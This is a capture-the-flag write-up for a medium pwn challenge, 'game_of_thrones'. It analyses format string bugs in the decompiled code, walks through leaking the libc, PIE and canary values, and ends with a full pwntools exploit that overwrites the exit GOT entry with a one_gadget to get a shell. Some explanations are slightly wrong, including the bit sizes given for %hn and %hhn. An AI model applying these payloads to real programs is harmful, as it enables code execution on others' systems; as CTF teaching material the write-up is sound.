# game_of_thrones

Author: [d1g174l_f0rtr355](https://twitter.com/BhaskaraShravya)

Solves: 10

Difficulty: Medium

## Preliminary Analysis:

As we can see, the binary given to us is a 64-bit non-stripped file with the following checks enabled.
```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Since all the basic security checks are enabled, there is little we can do to think about the approach. Hence let's start debugging and analyzing. One may make of the decompilers such as Ghidra/ IDA to decompile the binary as there was no source code given at the time of the CTF. I have used IDA in my decompilation.

## Understanding the challenge

At first glance we find a few functions present in the binary such as `use_dragons`, `kings_landing`, and `white_walkers` that are of interest to us. Let's take a look at each of these functions to understand what is going on.

- use_dragons: Upon entering option `1`, main redirects us to this function where we observe a very crucial fortmat string bug in the program. This happens beacuse `printf` usually takes in 2 arguments. The first one being a format specifier, and the second one being the variable whose data or address needs to be printed out. Looking at the decompiled code below it is obvious that since the only argument given to printf() is the varible `buffer` which is user controlled, we can very well take advantage of this bug and cause various memory leaks in the program. However, since we are only taking 10 characters of input string, it may not be enough to overwrite any data. 
```
  printf("\n\nYou currently have %d number of dragons.\n", 3LL);
  printf("\nSay something in Valyrian: ");
  __isoc99_scanf("%10s", buffer);
  getchar();
  printf("The dragons say: ");
  printf(buffer);
  return 3LL;
```
- kings_landing: This function presents us with a switch case like scenario, wherein if we choose option `1`, we simply get a message saying `No men left in the army! You cannot kill the knight king. ` and the `men` is made 0. However, option `2`, firstly checks if the `dragons` count is between 1 and 3, if so it then asks us how many dragons we wish to use. Here we find another similar format_string type bug. This time we can also read in more characters (upto 50). 
```
  if ( choice == 49 )
  {
    puts("No men left in the army! You cannot kill the knight king. ");
    *men = 0;
  }
  else if ( choice == 50 )
  {
    if ( *dragons && *dragons <= 3u )
    {
      printf("How many dragons would you like to use ?\n> ");
      __isoc99_scanf("%u", &num);
      if ( num && num <= 3 )
      {
        *dragons -= num;
        printf("%u dragon(s) have been used!\nAre you going to kill the white walkers ?\n> ", num);
        getchar();
        __isoc99_scanf("%50[^\n]s", format);
        printf(format);
      }
      else
      {
        puts("You only use dragons that you have");
        exit_function(0LL);
      }
    }
    else
    {
      puts("You have too less or too many dragons! ");
      exit_function(0LL);
    }
  }
  else
  {
    puts("Give a valid choice next time! ");
    exit_function(0LL);
  }
```

- white_walkers: This function checks whether the number of `men` is equal to `30000` and number of `dragons` is equal to 200. If tru, it calls the `exit_function` with an argument `1` else the argument is `0`. 
```
  puts("You are going to battle against an army of the dead! ");
  if ( *a1 == 30000 || *a2 == 200 )
  {
    puts(
      "Wonderful! You have defeated the army of the dead and have conquered King's Landing. You are the true ruler of the"
      " seven kingdoms. ");
    return exit_function(1LL);
  }
  else
  {
    puts("You do not have enough men or dragons to defeat the army of the dead");
    return exit_function(0LL);
  }
```
- exit_function: This function is pretty simple, if the argument is `1` it calls `exit()` else, it simply returns
```
  if ( arg )
    exit(1);
```

## Exploitation:

From the above understanding of the program, we can conclude a few things:
- Since `PIE` and `Canary` are enabled, we will have to leak them using the format string bug in `use_dragons`. Followed by this, we can also get a libc leak in a similar fashion. The format specifier usually used to leakd addresses is `%x` or `%p`. I'll be using `%p` in my exploit.
- Overwrite the global variables `num_men` and `num_dragons` with `30000` and `200` so as to call `exit()` in `exit_function`. We use `%N` to overwrite the 8 bit word, a `%hn` to overwrite a 4 bit word, and a `%hhn` to overwrite a 2 bit word.
- Lastly, we shall overwrite `exit_got` with a `one_gadget` address. The address of this `one_gadget` can be obtained using the [one_gadget](https://github.com/david942j/one_gadget) tool. The libc is also provided, so there shouldn't be an issue regarding different offsets in libc.

For leaking the addresses, we may simply look at the stack, i.e set a breakpoint before `printf` in `use_dragons` is called. I found the offsets for the `libc`, `canary` and `code` to be at `9`, `11`, and `13`. Furthermore, in order to overwrite the global variables `num_dragons` and `num_men`, the offset can be checked by spamming a few a's and then leaking the addresses to know where our input string begins. For example in this case our offset for writing can be calculated as:

```
Are you going to kill the white walkers ?
> aaaaaaaaaaaaaaa %p %p %p %p %p %p %p %p %p %p %p
aaaaaaaaaaaaaaa 0xa (nil) (nil) 0x31 0x7fffffff 0x55adae26d96c 0x55adae26d928 0x7fe6934688a0 0x132310b9f 0x6161616161616161 0x2061616161616161
```
Since our input string `aaaaaaaaaaaaaaa` is found at offset `10` with `0xa` beign leaked at offset `1`, we can say that everything we write onto the stack will get stored from offset `10`. Thus while overwriting, we may just keep in mind the required offset by looking into GDB and if there is any buffer needed to just align the addresses to 8 bytes.

Also looking at the registers when the exit() function is finally called, I used the following libc offset for execve call:
```
0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL
````


## Exploit:
```
def use_dragons(data):
	p.sendlineafter('Your choice: ', '1')
	p.sendlineafter('Say something in Valyrian: ', data)
	s = p.recvline()
	leak = int(s[-15:-1], 16)
	
	return leak
	
def kings_landing(choice, num_dragons, data):
	p.sendlineafter('Your choice: ', choice)
	p.sendline('2')
	p.sendlineafter('How many dragons would you like to use ?\n> ', str(num_dragons))
	p.sendlineafter('Are you going to kill the white walkers ?\n> ', data)
	
def white_walkers(choice):
	p.sendlineafter('Your choice: ', choice)
	
from pwn import *

p = process('./chall', env={"LD_PRELOAD":"./libc.so.6"})
exe = ELF('./chall')

gdb.attach(p, gdbscript='b*use_dragons+167\nb*kings_landing+333\nc\n')

libc = use_dragons("%9$p") - 0x95106
info('libc: %s'%hex(libc))

code = use_dragons("%13$p") - 0x160a
info('code: %s'%hex(code))

canary = use_dragons("%11$p")
info('canary: %s'%hex(canary))

num_men = code + exe.symbols['num_men']
num_dragons = code + exe.symbols['num_dragons']
exit = code + exe.got['exit']
info('num_men: %s'%hex(num_men))
info('num_dragons: %s'%hex(num_dragons))
info('exit: %s'%hex(exit))

one_gadget = libc + 0xe6c81

pay1 = '%{}p'.format(30000-4)
pay1 += 'a'*4
pay1 += '%12$n'
pay1 += p64(num_men)

#info('num_men: %s'%hex(num_men))
kings_landing('2', 1, pay1)

off1 = int('0x' + hex(one_gadget)[-4:], 16)# lsb
#print(off1)
off2 = int('0x' + hex(one_gadget)[-8:-4], 16)# msb
#print(off2)

while(off1>off2):
		off2 += 0x10000

pay2 = '%{}p'.format(off1-4)
pay2 += 'a'*4
pay2 += '%14$n'
pay2 += '%{}p'.format(off2-off1-3)
pay2 += 'b'*3
pay2 += '%15$hn'
pay2 += p64(exit)
pay2 += p64(exit+2)

kings_landing('\n2', 1, pay2)

pay3 = '%{}p'.format(200-6)
pay3 += 'c'*6
pay3 += '%12$n'
pay3 += p64(num_dragons)

kings_landing('\n2', 1, pay3)

white_walkers('\n3')

p.interactive()
```

